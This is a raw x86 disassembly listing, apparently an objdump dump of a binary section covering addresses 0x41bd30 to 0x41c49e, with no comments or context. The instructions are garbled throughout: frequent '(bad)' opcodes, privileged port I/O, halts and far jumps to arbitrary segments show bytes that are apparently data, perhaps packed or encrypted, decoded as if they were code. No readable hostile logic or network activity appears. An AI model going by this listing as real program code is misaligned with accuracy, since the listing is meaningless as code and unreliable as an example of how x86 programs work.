  41bd30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd31:	jl     0x41bd1b
  41bd33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd34:	fcomp  QWORD PTR [ecx+eax*1-0x57d77c32]
  41bd3b:	ja     0x41bcde
  41bd3d:	inc    esp
  41bd3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd3f:	(bad)  
  41bd40:	sti    
  41bd41:	fnstenv [esi-0x6f]
  41bd44:	loope  0x41bd14
  41bd46:	xchg   ecx,eax
  41bd47:	inc    edx
  41bd48:	mov    ebx,0xb1d6d54
  41bd4d:	and    cl,BYTE PTR [ebp-0x5a]
  41bd50:	dec    ebp
  41bd51:	rcl    DWORD PTR [edi+0x1a],0x42
  41bd55:	outs   dx,DWORD PTR ds:[esi]
  41bd56:	mov    bl,0xe6
  41bd58:	(bad)  
  41bd59:	out    0x9c,eax
  41bd5b:	stc    
  41bd5c:	and    bl,bh
  41bd5e:	lock cmp DWORD PTR [esi+eiz*2+0x28],ebx
  41bd63:	mov    ebp,0x9ce74cfa
  41bd68:	mov    ds:0xcd53b390,al
  41bd6d:	test   al,0x49
  41bd6f:	sbb    ecx,0x76d9ac6
  41bd75:	jp     0x41bd71
  41bd77:	fld    DWORD PTR [eax]
  41bd79:	(bad)  
  41bd7a:	stos   DWORD PTR es:[edi],eax
  41bd7b:	jo     0x41bda2
  41bd7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd7e:	mov    dl,BYTE PTR ds:0xb2dc025b
  41bd84:	inc    edx
  41bd85:	stos   BYTE PTR es:[edi],al
  41bd86:	fptan  
  41bd88:	mov    ds:0xc43f7d9f,al
  41bd8d:	nop
  41bd8e:	cwde   
  41bd8f:	dec    esi
  41bd90:	sub    ebx,ebp
  41bd92:	push   eax
  41bd93:	iret   
  41bd94:	(bad)  
  41bd95:	fild   QWORD PTR [edx+0x2c]
  41bd98:	scas   eax,DWORD PTR es:[edi]
  41bd99:	or     DWORD PTR [ebx+0x6c],esi
  41bd9c:	stos   BYTE PTR es:[edi],al
  41bd9d:	ror    DWORD PTR ds:0x74001607,cl
  41bda3:	ins    DWORD PTR es:[edi],dx
  41bda4:	mov    eax,ds:0x595479ab
  41bda9:	jno    0x41bdda
  41bdab:	mov    cl,0xa8
  41bdad:	pop    ds
  41bdae:	ja     0x41bd96
  41bdb0:	enter  0x467b,0x4e
  41bdb4:	lock ficom WORD PTR [eax+0x26]
  41bdb8:	inc    esi
  41bdb9:	enter  0xab3e,0x58
  41bdbd:	jp     0x41bdb8
  41bdbf:	fbstp  TBYTE PTR [eax+0xade8f4a]
  41bdc5:	jb     0x41bd99
  41bdc7:	loop   0x41be07
  41bdc9:	jbe    0x41bd54
  41bdcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bdcc:	mov    ch,0x5b
  41bdce:	js     0x41bded
  41bdd0:	cwde   
  41bdd1:	jno    0x41bdfc
  41bdd3:	push   ecx
  41bdd4:	in     al,0x2e
  41bdd6:	lds    esp,FWORD PTR [ecx+0xb]
  41bdd9:	dec    esi
  41bdda:	mov    dh,0x5d
  41bddc:	lahf   
  41bddd:	adc    eax,ebx
  41bddf:	ss in  al,0xb8
  41bde2:	xchg   edx,eax
  41bde3:	lods   eax,DWORD PTR ds:[esi]
  41bde4:	pop    ss
  41bde5:	cld    
  41bde6:	jg     0x41bd82
  41bde8:	(bad)  
  41bde9:	aam    0xa7
  41bdeb:	push   edi
  41bdec:	xchg   edx,eax
  41bded:	push   es
  41bdee:	rcr    DWORD PTR [edx+0x2b2a97be],1
  41bdf4:	clc    
  41bdf5:	inc    ebp
  41bdf6:	jns    0x41bd88
  41bdf8:	cdq    
  41bdf9:	mov    al,0x98
  41bdfb:	xchg   esp,eax
  41bdfc:	adc    ebp,edi
  41bdfe:	xchg   edi,eax
  41bdff:	xchg   ebx,eax
  41be00:	rcl    ebx,1
  41be02:	nop
  41be03:	mov    dh,0xa4
  41be05:	or     DWORD PTR ds:0xf8468b3,ebp
  41be0b:	repz pop eax
  41be0d:	or     al,0xfc
  41be0f:	and    eax,0x1f3e1189
  41be14:	jecxz  0x41bdb1
  41be16:	outs   dx,DWORD PTR ds:[esi]
  41be17:	into   
  41be18:	push   edi
  41be19:	mov    al,0x51
  41be1b:	or     BYTE PTR [esi+0x30e78475],dl
  41be21:	inc    edi
  41be22:	lods   eax,DWORD PTR ds:[esi]
  41be23:	js     0x41be15
  41be25:	je     0x41be39
  41be27:	mov    edi,0x229a69c6
  41be2c:	clc    
  41be2d:	cmp    eax,esi
  41be2f:	lods   eax,DWORD PTR ds:[esi]
  41be30:	add    DWORD PTR [edi-0xb],eax
  41be33:	bound  esp,QWORD PTR [ebp+0x1e041c9d]
  41be39:	sub    eax,DWORD PTR [esi+0x6463ae8a]
  41be3f:	pop    eax
  41be40:	out    0x79,eax
  41be42:	fdecstp 
  41be44:	(bad)  
  41be45:	push   edx
  41be46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be47:	push   0x2aff7b90
  41be4c:	dec    ebp
  41be4d:	jecxz  0x41be01
  41be4f:	call   FWORD PTR [edi+0x1f]
  41be52:	dec    edx
  41be53:	ss repz into 
  41be56:	cs addr16 inc esp
  41be59:	and    DWORD PTR [eax+0x619f92e8],0x270c4176
  41be63:	mov    bh,0x1e
  41be65:	jge    0x41becc
  41be67:	sbb    al,0x6e
  41be69:	repz mov ebx,0xea47dceb
  41be6f:	sub    eax,0x8168ef26
  41be74:	ret    0x9a6c
  41be77:	ins    DWORD PTR es:[edi],dx
  41be78:	hlt    
  41be79:	push   esi
  41be7a:	fnsave [edx-0x6a]
  41be7d:	mov    bl,0xce
  41be7f:	dec    ebx
  41be80:	and    dl,dl
  41be82:	pop    ecx
  41be83:	jmp    DWORD PTR [esi]
  41be85:	add    dl,BYTE PTR [edi+0x7bc57140]
  41be8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be8c:	loopne 0x41bee9
  41be8e:	mov    dh,0x8c
  41be90:	mov    ?,WORD PTR [edi]
  41be92:	cmp    BYTE PTR [ecx-0x58],cl
  41be95:	inc    edi
  41be96:	iret   
  41be97:	nop
  41be98:	mov    ebp,0x69d80e20
  41be9d:	out    dx,al
  41be9e:	jb     0x41be49
  41bea0:	addr16 ret 
  41bea2:	jb     0x41bebd
  41bea4:	push   0xa79fa1de
  41bea9:	pop    ecx
  41beaa:	push   esp
  41beab:	sbb    BYTE PTR ds:0x806f4113,0x98
  41beb2:	xchg   esi,eax
  41beb3:	dec    edi
  41beb4:	cmp    esi,esp
  41beb6:	pop    ebp
  41beb7:	add    al,0x7a
  41beb9:	(bad)  
  41bebb:	inc    DWORD PTR [esi+0x1a]
  41bebe:	cli    
  41bebf:	mov    eax,eax
  41bec1:	jmp    0x4c2c7296
  41bec6:	cmp    eax,0xad078374
  41becb:	rcr    BYTE PTR [ebx],0xb
  41bece:	jmp    0xce75:0x837a0014
  41bed5:	mov    WORD PTR [edi+0x4aa1feae],ss
  41bedb:	push   es
  41bedc:	cmp    al,0x9e
  41bede:	sbb    al,0x42
  41bee0:	sbb    DWORD PTR [ebx+0x762035ed],esp
  41bee6:	jns    0x41bea2
  41bee8:	or     ch,BYTE PTR [esi+0x31]
  41beeb:	inc    eax
  41beec:	jno    0x41bec8
  41beee:	pop    ss
  41beef:	fild   WORD PTR [edi-0x10e4f109]
  41bef5:	int    0x95
  41bef7:	pop    ecx
  41bef8:	movntps XMMWORD PTR [edx-0x6c],xmm2
  41befc:	lea    ecx,[ebx+eiz*2+0xcbdddce]
  41bf03:	out    dx,eax
  41bf04:	and    DWORD PTR [ecx],ebp
  41bf06:	aam    0xc2
  41bf08:	iret   
  41bf09:	and    eax,0x4688da49
  41bf0e:	lods   al,BYTE PTR ds:[esi]
  41bf0f:	mov    ah,0xa5
  41bf11:	pop    es
  41bf12:	jle    0x41bf92
  41bf14:	mov    ss,WORD PTR [eax-0x2740f95f]
  41bf1a:	mov    WORD PTR [ebx-0x30cf96a3],ss
  41bf20:	xchg   esi,eax
  41bf21:	mov    edi,0xf8dd9ed
  41bf26:	push   edi
  41bf27:	mov    ds:0xb1d984e3,al
  41bf2c:	mov    edi,0xf3802eda
  41bf31:	xacquire xchg DWORD PTR [ecx+0x7d],edi
  41bf35:	fild   QWORD PTR [edx-0x49]
  41bf38:	test   BYTE PTR [eax+0x13c32232],bl
  41bf3e:	scas   al,BYTE PTR es:[edi]
  41bf3f:	out    dx,eax
  41bf40:	cmp    cl,ah
  41bf42:	in     al,dx
  41bf43:	sub    al,0x36
  41bf45:	test   eax,0x20ed1528
  41bf4a:	jns    0x41bf55
  41bf4c:	stos   BYTE PTR es:[edi],al
  41bf4d:	(bad)  
  41bf4e:	int    0x46
  41bf50:	or     eax,0x5ae5d980
  41bf55:	xor    eax,0x43f71988
  41bf5a:	add    al,0xc5
  41bf5c:	popa   
  41bf5d:	pop    esp
  41bf5e:	sub    esi,0xd54de566
  41bf64:	rcl    DWORD PTR [edi+0x67f72f73],0x59
  41bf6b:	setg   BYTE PTR [eax]
  41bf6e:	fmul   QWORD PTR [edx-0x61]
  41bf71:	test   eax,0x61a4258e
  41bf76:	test   eax,0xdcc84de6
  41bf7b:	daa    
  41bf7c:	rcr    BYTE PTR [ebx],1
  41bf7e:	mov    ebx,0x95016629
  41bf83:	add    ch,BYTE PTR [esi]
  41bf85:	jg     0x41bf80
  41bf87:	mov    edx,0x117378dd
  41bf8c:	add    DWORD PTR [eax+edx*8+0x4d],esp
  41bf90:	out    0xf8,eax
  41bf92:	lods   eax,DWORD PTR ds:[esi]
  41bf93:	jmp    0xe801:0x7bf0b477
  41bf9a:	push   0xa5fbdfea
  41bf9f:	xor    ebp,ebx
  41bfa1:	aam    0xa4
  41bfa3:	adc    al,0x47
  41bfa5:	(bad)  
  41bfa6:	repnz test BYTE PTR [ebx-0x6926f1ac],ch
  41bfad:	stc    
  41bfae:	add    ebx,0xaebae38
  41bfb4:	fcmovne st,st(1)
  41bfb6:	sbb    DWORD PTR [ebx],esp
  41bfb8:	bound  esp,QWORD PTR [ebx+0x71173e3e]
  41bfbe:	gs mov al,0xcf
  41bfc1:	push   ecx
  41bfc2:	mov    BYTE PTR [edi],bl
  41bfc4:	retf   
  41bfc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bfc6:	scas   al,BYTE PTR es:[edi]
  41bfc7:	shl    edx,1
  41bfc9:	jb     0x41bf80
  41bfcb:	cmp    al,0xe6
  41bfcd:	push   edi
  41bfce:	or     ch,bl
  41bfd0:	cmp    ebp,edx
  41bfd2:	icebp  
  41bfd3:	loop   0x41bf93
  41bfd5:	add    al,0xfe
  41bfd7:	adc    ebx,DWORD PTR [edx]
  41bfd9:	jno    0x41bf7e
  41bfdb:	pop    ss
  41bfdc:	sbb    dl,0xa2
  41bfdf:	xchg   ecx,eax
  41bfe0:	sub    dl,bh
  41bfe2:	adc    ebx,DWORD PTR ds:[edi]
  41bfe5:	pop    ds
  41bfe6:	jmp    0x27d3:0xb32e5164
  41bfed:	jo     0x41bfc7
  41bfef:	fcom   DWORD PTR [eax-0x4a]
  41bff2:	popf   
  41bff3:	retf   0x6a19
  41bff6:	mov    ebx,0x9455ac6a
  41bffb:	mov    ebp,0x7afae751
  41c000:	fldcw  WORD PTR [esi+0x47]
  41c003:	retf   
  41c004:	adc    eax,0x775fa7ee
  41c009:	or     edi,DWORD PTR [ebx+0x4df5bfb2]
  41c00f:	adc    eax,0xdfaa1efb
  41c014:	ret    0x281f
  41c017:	pop    ebp
  41c018:	adc    eax,DWORD PTR [ebp+0x4fd8cbe4]
  41c01e:	das    
  41c01f:	call   0x7fc3c13
  41c024:	aas    
  41c025:	int3   
  41c026:	ss js  0x41c094
  41c029:	add    eax,0xa738223f
  41c02e:	shl    ch,cl
  41c030:	fisttp QWORD PTR [edi-0x30]
  41c033:	sti    
  41c034:	(bad)  
  41c035:	out    dx,eax
  41c036:	fdivr  st(2),st
  41c038:	add    al,0x1b
  41c03a:	aas    
  41c03b:	aas    
  41c03c:	mov    bh,0x53
  41c03e:	sub    al,0x4e
  41c040:	jne    0x41c09a
  41c042:	test   BYTE PTR [ecx],0x33
  41c045:	mov    esi,0x4caff55e
  41c04a:	or     eax,0x973904a1
  41c04f:	mov    ecx,0x80f9216a
  41c054:	push   0xfffffff5
  41c056:	je     0x41bfed
  41c058:	sbb    eax,0x5cb880db
  41c05d:	aas    
  41c05e:	jo     0x41c039
  41c060:	outs   dx,BYTE PTR ds:[esi]
  41c061:	xor    eax,0xadd8891a
  41c066:	inc    esp
  41c067:	add    BYTE PTR [edi+0x38c79348],0xa9
  41c06e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c06f:	loopne 0x41c0e0
  41c071:	add    BYTE PTR [eax],al
  41c073:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c074:	pop    eax
  41c075:	dec    eax
  41c076:	add    BYTE PTR [esi+0x0],dl
  41c079:	sti    
  41c07a:	xchg   esp,eax
  41c07b:	neg    DWORD PTR [edx]
  41c07d:	jno    0x41c0c6
  41c07f:	repnz mov edi,0x71fc51df
  41c085:	fcomp  QWORD PTR [ecx+edx*1+0x48]
  41c089:	into   
  41c08a:	popa   
  41c08b:	popf   
  41c08c:	in     al,dx
  41c08d:	jmp    0x3b1b1004
  41c092:	or     BYTE PTR [edx],ch
  41c094:	push   esp
  41c095:	sub    dl,ah
  41c097:	sar    BYTE PTR [edx],1
  41c099:	ja     0x41c05c
  41c09b:	mov    BYTE PTR [esi+0x7f1d29f1],al
  41c0a1:	cli    
  41c0a2:	ffreep st(5)
  41c0a4:	cmp    BYTE PTR [edx+0x6391bef],cl
  41c0aa:	sbb    edi,DWORD PTR [edi+edi*4+0x3097eee]
  41c0b1:	pop    edx
  41c0b2:	mov    al,0x96
  41c0b4:	add    eax,0xce22daef
  41c0b9:	adc    DWORD PTR fs:[ebp-0x35],ebp
  41c0bd:	inc    ecx
  41c0be:	rcl    BYTE PTR [ebx+0x68],1
  41c0c1:	ins    DWORD PTR es:[edi],dx
  41c0c2:	aaa    
  41c0c3:	and    eax,0xad48e616
  41c0c8:	jne    0x41c0ea
  41c0ca:	daa    
  41c0cb:	imul   eax,DWORD PTR [ecx-0x19122adb],0x27
  41c0d2:	out    dx,eax
  41c0d3:	int3   
  41c0d4:	ret    0x4ca
  41c0d7:	nop
  41c0d8:	dec    BYTE PTR [ebx]
  41c0da:	mov    WORD PTR [edi+0x4b],ds
  41c0dd:	cmp    BYTE PTR [edi+0x1b9aac34],ah
  41c0e3:	jae    0x41c0df
  41c0e5:	push   ss
  41c0e6:	cmc    
  41c0e7:	mov    dh,0x4f
  41c0e9:	fwait
  41c0ea:	jmp    0x41c0ac
  41c0ec:	cmp    bl,dh
  41c0ee:	lahf   
  41c0ef:	jmp    0x41c0eb
  41c0f1:	sbb    eax,0xce8e2c3d
  41c0f6:	out    0x5b,eax
  41c0f8:	cmp    al,0xbd
  41c0fa:	sub    eax,0x5720db4a
  41c0ff:	fwait
  41c100:	add    dh,BYTE PTR ds:0xe1e6c6ed
  41c106:	dec    DWORD PTR [ebx]
  41c108:	cmp    al,0x30
  41c10a:	sub    ah,BYTE PTR [esi+ecx*4]
  41c10d:	ror    BYTE PTR [ebx-0x1e81a019],1
  41c113:	sahf   
  41c114:	mov    es,edi
  41c116:	adc    ebp,ebp
  41c118:	std    
  41c119:	sub    dh,BYTE PTR [ebx-0x4]
  41c11c:	retf   
  41c11d:	sbb    cl,al
  41c11f:	mov    ds:0xd3f13bd1,eax
  41c125:	adc    eax,0x702dcc0f
  41c12a:	sti    
  41c12b:	xchg   edi,eax
  41c12c:	test   ebx,edx
  41c12e:	pop    eax
  41c12f:	push   0xffffff9a
  41c131:	cld    
  41c132:	xchg   esi,eax
  41c133:	mov    dh,cl
  41c135:	pop    ss
  41c136:	xlat   BYTE PTR ds:[ebx]
  41c137:	inc    esp
  41c138:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c139:	shr    cl,cl
  41c13b:	mov    bh,0xfb
  41c13d:	xchg   ebx,eax
  41c13e:	xchg   edx,eax
  41c13f:	pop    ss
  41c140:	mov    eax,ds:0xf2d12f7e
  41c145:	xlat   BYTE PTR ds:[ebx]
  41c146:	mov    ebx,0xc361f82a
  41c14b:	cli    
  41c14c:	push   ecx
  41c14d:	jbe    0x41c1a4
  41c14f:	into   
  41c150:	shl    DWORD PTR [eax+edx*8+0x4e0f1985],1
  41c157:	and    eax,0x451cf0b8
  41c15c:	xor    ah,ch
  41c15e:	test   al,0x67
  41c160:	cs retf 
  41c162:	push   esp
  41c163:	sti    
  41c164:	bound  edx,QWORD PTR [ebp+0x20]
  41c167:	xchg   ebp,eax
  41c168:	jo     0x41c12b
  41c16a:	ins    BYTE PTR es:[edi],dx
  41c16b:	xor    eax,0x8054421a
  41c170:	popf   
  41c171:	mov    edi,0x73d7981b
  41c176:	inc    ecx
  41c177:	lds    ecx,FWORD PTR [ecx]
  41c179:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c17a:	push   ebp
  41c17b:	test   eax,0xe8a7efcf
  41c180:	(bad)  
  41c181:	cmp    al,0xfd
  41c183:	aad    0x8c
  41c185:	mov    edx,0x45ef3476
  41c18a:	rcr    BYTE PTR [ebx+0x63],cl
  41c18d:	nop
  41c18e:	addr16 js 0x41c114
  41c191:	mov    dh,0x5a
  41c193:	jns    0x41c1c4
  41c195:	data16 jg 0x41c19c
  41c198:	or     BYTE PTR [esi-0x49],al
  41c19b:	xor    bh,ch
  41c19d:	pop    edi
  41c19e:	mov    dl,0xb4
  41c1a0:	jb     0x41c1b6
  41c1a2:	inc    edi
  41c1a3:	inc    ebp
  41c1a4:	adc    DWORD PTR [eax-0x24],ebp
  41c1a7:	arpl   WORD PTR [ebx-0x4480669c],ax
  41c1ad:	ror    BYTE PTR [edx+eax*2],cl
  41c1b0:	(bad)  
  41c1b1:	in     al,dx
  41c1b2:	jmp    0x41c219
  41c1b4:	cwde   
  41c1b5:	and    al,ch
  41c1b7:	pop    eax
  41c1b8:	dec    ebp
  41c1b9:	stos   BYTE PTR es:[edi],al
  41c1ba:	(bad)  
  41c1bb:	scas   al,BYTE PTR es:[edi]
  41c1bc:	js     0x41c1f5
  41c1be:	imul   edi,DWORD PTR [edi],0x6c
  41c1c1:	aaa    
  41c1c2:	jae    0x41c1e6
  41c1c4:	outs   dx,BYTE PTR ds:[esi]
  41c1c5:	outs   dx,BYTE PTR ds:[esi]
  41c1c6:	push   edx
  41c1c7:	sub    DWORD PTR [ebx-0x4e22e855],ecx
  41c1cd:	stos   BYTE PTR es:[edi],al
  41c1ce:	in     al,dx
  41c1cf:	lods   al,BYTE PTR ds:[esi]
  41c1d0:	mov    ds:0x8e87a922,eax
  41c1d5:	in     eax,0xda
  41c1d7:	push   ecx
  41c1d8:	repnz test DWORD PTR ss:[ebx-0x1c6a843f],eax
  41c1e0:	adc    esi,DWORD PTR ds:0x53ae4769
  41c1e6:	addr16 ret 
  41c1e8:	shl    DWORD PTR [ebx+0x335917bc],0x9e
  41c1ef:	push   edi
  41c1f0:	jmp    0x67d3:0x3ea214be
  41c1f7:	adc    al,0xb4
  41c1f9:	fdiv   st(1),st
  41c1fb:	cmp    al,0x81
  41c1fd:	sbb    DWORD PTR [edx-0x29c656e9],edi
  41c203:	nop
  41c204:	lock pop ss
  41c206:	das    
  41c207:	push   es
  41c208:	lods   eax,DWORD PTR ds:[esi]
  41c209:	(bad)  
  41c20b:	(bad)  
  41c20c:	frstor [ebx+ebx*1]
  41c20f:	pop    ecx
  41c210:	das    
  41c211:	or     ah,BYTE PTR ds:0x13e64f27
  41c217:	pop    edx
  41c218:	jbe    0x41c295
  41c21a:	jo     0x41c1ff
  41c21c:	std    
  41c21d:	mov    BYTE PTR [edi*2+0x2049142d],cl
  41c224:	pop    ds
  41c225:	es jle 0x41c1e5
  41c228:	mov    esi,0x3c9ccb48
  41c22d:	cmp    DWORD PTR [eax+0x3131eff9],0xffffffdc
  41c234:	sub    eax,0xcb554df3
  41c239:	sub    DWORD PTR [ebx],0x50
  41c23c:	add    DWORD PTR [ecx+0x5b43b25b],0xffffffae
  41c243:	fnstcw WORD PTR [eax]
  41c245:	dec    BYTE PTR [esi]
  41c247:	mov    dh,0xc9
  41c249:	test   BYTE PTR [eax-0x4f5306a9],al
  41c24f:	fnsave ds:0xdeed766c
  41c255:	pop    eax
  41c256:	xor    esp,DWORD PTR [esi-0x4f]
  41c259:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c25a:	jae    0x41c206
  41c25c:	adc    dh,BYTE PTR [esi+0x211d93e1]
  41c262:	sti    
  41c263:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c264:	test   eax,esp
  41c266:	cld    
  41c267:	fwait
  41c268:	(bad)  
  41c269:	mov    bl,0x18
  41c26b:	jmp    DWORD PTR [ebx-0x46]
  41c26e:	xlat   BYTE PTR ds:[ebx]
  41c26f:	mov    BYTE PTR [ecx+0x69375835],cl
  41c275:	mov    ebx,0x71bb988c
  41c27a:	jno    0x41c2e9
  41c27c:	aaa    
  41c27d:	nop
  41c27e:	jge    0x41c21b
  41c280:	or     ecx,0x17
  41c283:	add    ebp,edi
  41c285:	js     0x41c23e
  41c287:	cmp    ecx,edx
  41c289:	dec    edi
  41c28a:	jbe    0x41c2a5
  41c28c:	inc    ebx
  41c28d:	jmp    0x41c220
  41c28f:	adc    al,0x77
  41c291:	dec    ebp
  41c292:	out    0x57,al
  41c294:	mov    ah,0xc5
  41c296:	mov    cs,WORD PTR [edx-0xf]
  41c299:	push   edi
  41c29a:	or     BYTE PTR [edx-0x23da30ce],bh
  41c2a0:	imul   eax,DWORD PTR [edi+0x59a55df2],0xffffffa7
  41c2a7:	stos   DWORD PTR es:[edi],eax
  41c2a8:	add    al,0x53
  41c2aa:	das    
  41c2ab:	retf   0xc458
  41c2ae:	or     BYTE PTR [ebx+eiz*8],ch
  41c2b1:	dec    eax
  41c2b2:	sar    eax,0x54
  41c2b5:	jb     0x41c2b4
  41c2b7:	pop    es
  41c2b8:	mov    ds:0xd7fd79d5,al
  41c2bd:	ror    DWORD PTR [ecx+edx*4+0x4d],cl
  41c2c1:	shl    dh,1
  41c2c3:	ret    
  41c2c4:	(bad)  
  41c2c5:	sahf   
  41c2c6:	inc    edi
  41c2c7:	mov    ?,WORD PTR [edx+eax*1-0x1648ea4c]
  41c2ce:	inc    ebp
  41c2cf:	test   al,0xb9
  41c2d1:	mov    ebx,0x5f2fdf1
  41c2d6:	push   cs
  41c2d7:	jecxz  0x41c281
  41c2d9:	scas   al,BYTE PTR es:[edi]
  41c2da:	dec    ebx
  41c2db:	out    0x6,eax
  41c2dd:	ret    0xd777
  41c2e0:	cmp    esi,edx
  41c2e2:	fdivr  QWORD PTR [esp+esi*4+0x16229f49]
  41c2e9:	sub    DWORD PTR [edi-0x38],esi
  41c2ec:	lock sbb DWORD PTR [ebx+ebp*4-0x30],esp
  41c2f1:	push   0xffffffc6
  41c2f3:	inc    edx
  41c2f4:	jp     0x41c359
  41c2f6:	in     al,dx
  41c2f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2f8:	push   0x2f
  41c2fa:	cmp    eax,0x86bbb88a
  41c2ff:	in     al,0x81
  41c301:	push   ss
  41c302:	stos   DWORD PTR es:[edi],eax
  41c303:	sbb    al,ch
  41c305:	mov    dh,0xe3
  41c307:	ss jo  0x41c2d8
  41c30a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c30b:	sub    edi,DWORD PTR [ebp+0xdd4fb26]
  41c311:	sub    eax,ecx
  41c313:	sbb    DWORD PTR [edx+0x57dec7e0],ebp
  41c319:	adc    ecx,DWORD PTR [edx-0x41]
  41c31c:	frstor [esi+0x4f368a16]
  41c322:	sar    DWORD PTR [ecx],cl
  41c324:	and    DWORD PTR [ecx],ebp
  41c326:	push   0xa49231de
  41c32b:	xchg   edi,eax
  41c32c:	push   ebp
  41c32d:	pop    ecx
  41c32e:	jle    0x41c345
  41c330:	jmp    0x1b1fcca5
  41c335:	mov    ds:0x398c832b,al
  41c33a:	(bad)  
  41c33c:	add    DWORD PTR [edx+0x21],esp
  41c33f:	rcr    esi,cl
  41c341:	fidiv  DWORD PTR fs:[eax-0x50]
  41c345:	fcomp  QWORD PTR [ebx+0x5778d55d]
  41c34b:	mov    al,0x31
  41c34d:	inc    esp
  41c34e:	imul   edi,DWORD PTR [esp+eiz*8],0xaf01b52f
  41c355:	xchg   esp,eax
  41c356:	mov    dl,0xf8
  41c358:	clc    
  41c359:	push   ebp
  41c35a:	pushf  
  41c35b:	cmc    
  41c35c:	cmp    al,0x21
  41c35e:	push   es
  41c35f:	outs   dx,DWORD PTR ds:[esi]
  41c360:	sbb    bl,BYTE PTR [edi+eax*8+0x6f91043d]
  41c367:	retf   0x7772
  41c36a:	mov    cs:0xc4415624,al
  41c370:	sub    DWORD PTR [ebx-0x10],esi
  41c373:	xor    eax,0xe26fccb0
  41c378:	sti    
  41c379:	leave  
  41c37a:	(bad)  
  41c37b:	arpl   WORD PTR [ebp+0x22],dx
  41c37e:	jle    0x41c3ec
  41c380:	in     eax,0x8a
  41c382:	pop    esp
  41c383:	mov    WORD PTR ds:0xb721e1ea,?
  41c389:	ret    
  41c38a:	adc    al,0x2b
  41c38c:	add    al,0xf0
  41c38e:	jge    0x41c3b5
  41c390:	hlt    
  41c391:	je     0x41c3ae
  41c393:	fmul   QWORD PTR [ebx]
  41c395:	retf   0x9c9c
  41c398:	xchg   esi,eax
  41c399:	arpl   WORD PTR [ecx],si
  41c39b:	jp     0x41c417
  41c39d:	push   es
  41c39e:	jg     0x41c391
  41c3a0:	hlt    
  41c3a1:	inc    eax
  41c3a2:	jmp    0xd660:0x168cb791
  41c3a9:	sbb    al,0xb7
  41c3ab:	fnstenv [eax-0x58]
  41c3ae:	bound  eax,QWORD PTR [edi]
  41c3b0:	not    BYTE PTR [esi+edi*2]
  41c3b3:	ret    
  41c3b4:	imul   esp,DWORD PTR [esi-0x66c33532],0xcbea820
  41c3be:	shl    BYTE PTR [ebx-0x43],0x6b
  41c3c2:	into   
  41c3c3:	scas   al,BYTE PTR es:[edi]
  41c3c4:	adc    BYTE PTR [esi-0x24],ah
  41c3c7:	cmp    ah,BYTE PTR [ebp-0xeee2324]
  41c3cd:	mov    edx,edx
  41c3cf:	bound  edx,QWORD PTR [ebx-0x1c]
  41c3d2:	xchg   ebp,eax
  41c3d3:	ror    dh,1
  41c3d5:	dec    ecx
  41c3d6:	push   0xffffffbe
  41c3d8:	inc    edx
  41c3d9:	(bad)  
  41c3da:	ja     0x41c3fc
  41c3dc:	fmul   QWORD PTR [edx+edx*8]
  41c3df:	sbb    al,0xf8
  41c3e1:	xchg   bh,dl
  41c3e3:	mov    esi,0xff27fd1
  41c3e8:	daa    
  41c3e9:	push   ds
  41c3ea:	inc    edx
  41c3eb:	cmp    al,dl
  41c3ed:	adc    eax,0xf47861a4
  41c3f2:	std    
  41c3f3:	cmp    al,0x5c
  41c3f5:	and    eax,0x600d015e
  41c3fa:	mov    cl,0x50
  41c3fc:	add    eax,0x3784ade3
  41c401:	ins    DWORD PTR es:[edi],dx
  41c402:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c403:	std    
  41c404:	mov    bl,0x5c
  41c406:	pusha  
  41c407:	dec    eax
  41c408:	xor    BYTE PTR [esi],cl
  41c40a:	mov    ah,0x4
  41c40c:	retf   0xa56b
  41c40f:	sub    eax,eax
  41c411:	sar    BYTE PTR [ebp+eax*2-0x7b393fa3],cl
  41c418:	int3   
  41c419:	pop    ecx
  41c41a:	jns    0x41c417
  41c41c:	test   eax,0x485b0e20
  41c421:	or     al,0x3b
  41c423:	sbb    al,0x51
  41c425:	js     0x41c3ee
  41c427:	lods   eax,DWORD PTR gs:[esi]
  41c429:	pop    eax
  41c42a:	(bad)  
  41c42b:	hlt    
  41c42c:	and    DWORD PTR ds:0x4849cba2,ebp
  41c432:	call   0xb3de:0xe507cb85
  41c439:	pop    esi
  41c43a:	and    DWORD PTR [edx-0x5bfe01d8],edi
  41c440:	test   DWORD PTR [ebp-0x51],edi
  41c443:	in     eax,dx
  41c444:	jmp    0x48f3:0x42d4b817
  41c44b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c44c:	xor    ebp,DWORD PTR [esi-0x170c752c]
  41c452:	es dec ebp
  41c454:	jl     0x41c40f
  41c456:	les    ebp,FWORD PTR [edx]
  41c458:	ds mov ch,0x73
  41c45b:	adc    BYTE PTR [ebx],dl
  41c45d:	push   0xa1730ff6
  41c462:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c463:	ret    
  41c464:	cmp    DWORD PTR [ecx],esi
  41c466:	mov    bl,0xa
  41c468:	add    cl,0xd1
  41c46b:	rol    ecx,1
  41c46d:	out    dx,eax
  41c46e:	cmp    DWORD PTR [eax-0x5a5d828a],edx
  41c474:	lea    edi,[ecx]
  41c476:	dec    esi
  41c477:	jmp    0x99acbaa0
  41c47c:	dec    edx
  41c47d:	jno    0x41c48c
  41c47f:	shl    BYTE PTR [ebp+0x58f57864],cl
  41c485:	jg     0x41c416
  41c487:	pop    edx
  41c488:	mov    ecx,0x17a1a045
  41c48d:	fistp  QWORD PTR [esi-0x44]
  41c490:	js     0x41c45d
  41c492:	mov    edx,0xb9a50967
  41c497:	lahf   
  41c498:	pop    esi
  41c499:	or     eax,0x5ea81bf1
  41c49e:	cdq    
